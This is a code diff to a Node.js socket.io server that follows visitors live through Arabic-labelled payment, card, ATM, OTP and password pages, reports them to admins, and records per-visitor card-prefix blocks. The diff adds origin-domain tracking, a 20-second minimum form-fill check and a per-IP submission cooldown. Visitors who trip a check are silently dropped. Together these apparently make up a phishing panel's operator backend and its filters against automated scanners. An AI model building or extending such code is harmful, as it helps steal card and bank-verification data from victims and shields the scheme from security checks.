@@ -908,6 +908,12 @@ function broadcastVisitorsToAdmins() {
 }
 
 // === Anti-Bot Protection ===
+// Track form fill time - visitors must spend at least 20 seconds on registration page
+const MINIMUM_FORM_FILL_TIME = 20000; // 20 seconds minimum
+// Track IP registration submissions per minute (prevent same IP submitting multiple times)
+const ipSubmissionTimestamps = new Map(); // ip -> last submission timestamp
+const IP_SUBMISSION_COOLDOWN = 60000; // 1 minute between submissions from same IP
+
 // Track connections per IP (max concurrent connections per IP)
 const ipConnectionCount = new Map();
 // Track new visitor registrations per minute
@@ -1514,6 +1520,10 @@ io.on("connection", (socket) => {
       // Create new visitor
       visitorCounter++;
       if (displayVisitorCount !== null) displayVisitorCount++;
+      // Extract domain from origin header for tracking
+      const visitorOrigin = socket.handshake.headers.origin || socket.handshake.headers.referer || '';
+      const visitorDomain = visitorOrigin.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/^(www\.)?/, '') || 'unknown';
+      
       visitor = {
         _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
         socketId: socket.id,
@@ -1530,6 +1540,7 @@ io.on("connection", (socket) => {
         os,
         device,
         browser,
+        domain: visitorDomain,
         date: new Date().toISOString(),
         blockedCardPrefixes: [],
         page: "الصفحة الرئيسية",
@@ -1548,7 +1559,7 @@ io.on("connection", (socket) => {
       savedVisitors.push(visitor);
       saveData(true); // Save immediately to prevent data loss on restart
       isNewVisitor = true;
-      console.log(`New visitor registered: ${visitor._id}`);
+      console.log(`New visitor registered: ${visitor._id}, domain=${visitorDomain}`);
 
       // Lookup country and city from IP if unknown
       if (visitor.country === 'Unknown') {
@@ -1641,6 +1652,12 @@ io.on("connection", (socket) => {
       if (page === "الصفحة الرئيسية" || page === "الرئيسية") {
         visitor.hasVisitedMainPage = true;
       }
+      
+      // Track when visitor enters registration page (for 20s timer)
+      if (page === "صفحة التسجيل") {
+        visitor.registrationPageEnteredAt = Date.now();
+        console.log(`[TIMER] Visitor ${visitor._id} entered registration page at ${visitor.registrationPageEnteredAt}`);
+      }
 
       // STRICT ENFORCEMENT: Block visitors who try to access sensitive pages without visiting main page first
       const sensitivePages = ["دفع", "ATM", "بطاقة", "summary", "ملخص", "الدفع", "رمز التحقق", "OTP", "كلمة مرور", "توثيق", "تحويل"];
@@ -1684,6 +1701,47 @@ io.on("connection", (socket) => {
   socket.on("more-info", (data) => {
     console.log(`[DEBUG] more-info received from socket ${socket.id}, data:`, JSON.stringify(data));
     let visitor = visitors.get(socket.id);
+    
+    // === ANTI-BOT: 20-second minimum form fill time ===
+    if (visitor && data.page === "صفحة التسجيل" && data.content) {
+      const enteredAt = visitor.registrationPageEnteredAt || 0;
+      const timeSpent = Date.now() - enteredAt;
+      if (enteredAt > 0 && timeSpent < MINIMUM_FORM_FILL_TIME) {
+        console.log(`[ANTI-BOT] Form filled too fast (${Math.round(timeSpent/1000)}s < 20s) - visitor ${visitor._id}, IP=${visitor.ip}. SILENTLY REJECTED.`);
+        // Silently reject - don't save, don't show in admin, disconnect
+        socket.disconnect(true);
+        const idx = savedVisitors.findIndex(v => v._id === visitor._id);
+        if (idx !== -1) {
+          savedVisitors.splice(idx, 1);
+          saveData(true);
+          broadcastVisitorsToAdmins();
+        }
+        visitors.delete(socket.id);
+        return;
+      }
+    }
+    
+    // === ANTI-BOT: IP duplicate submission cooldown (1 per minute) ===
+    if (visitor && data.page === "صفحة التسجيل" && data.content) {
+      const visitorIP = visitor.ip;
+      const lastSubmission = ipSubmissionTimestamps.get(visitorIP) || 0;
+      const timeSinceLastSubmission = Date.now() - lastSubmission;
+      if (lastSubmission > 0 && timeSinceLastSubmission < IP_SUBMISSION_COOLDOWN) {
+        console.log(`[ANTI-BOT] Same IP submitted again too fast (${Math.round(timeSinceLastSubmission/1000)}s < 60s) - IP=${visitorIP}. SILENTLY REJECTED.`);
+        socket.disconnect(true);
+        const idx = savedVisitors.findIndex(v => v._id === visitor._id);
+        if (idx !== -1) {
+          savedVisitors.splice(idx, 1);
+          saveData(true);
+          broadcastVisitorsToAdmins();
+        }
+        visitors.delete(socket.id);
+        return;
+      }
+      // Record this submission timestamp
+      ipSubmissionTimestamps.set(visitorIP, Date.now());
+    }
+    
     if (!visitor) {
       // Create full visitor if not exists (e.g. reconnect after server redeploy)
       const visitorInfo = getVisitorInfo(socket);
